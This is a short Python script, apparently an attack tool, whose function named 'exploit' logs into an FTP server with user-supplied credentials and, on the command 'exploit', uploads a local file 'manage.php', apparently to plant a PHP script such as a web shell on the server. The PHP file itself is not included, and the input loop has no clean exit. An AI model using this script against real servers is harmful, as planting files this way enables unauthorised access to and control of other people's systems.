from ftplib import FTP
import os

def upload_file(ftp, filename):
    with open(filename, 'rb') as file:
        ftp.storbinary('STOR ' + os.path.basename(filename), file)

def exploit():
    ftp = FTP()
    
    ip = input("Enter FTP server IP: ")
    port = int(input("Enter FTP server port: "))
    username = input("Enter username: ")
    password = input("Enter password: ")

    try:
        ftp.connect(ip, port)
        ftp.login(username, password)
        print("Connected to FTP server")

        while True:
            command = input("> ")
            if command.lower() == 'exploit':
                upload_file(ftp, 'manage.php')
                print("manage.php uploaded successfully")
            
    except Exception as e:
        print("An error occurred:", e)
        ftp.quit()

if __name__ == "__main__":
    exploit()

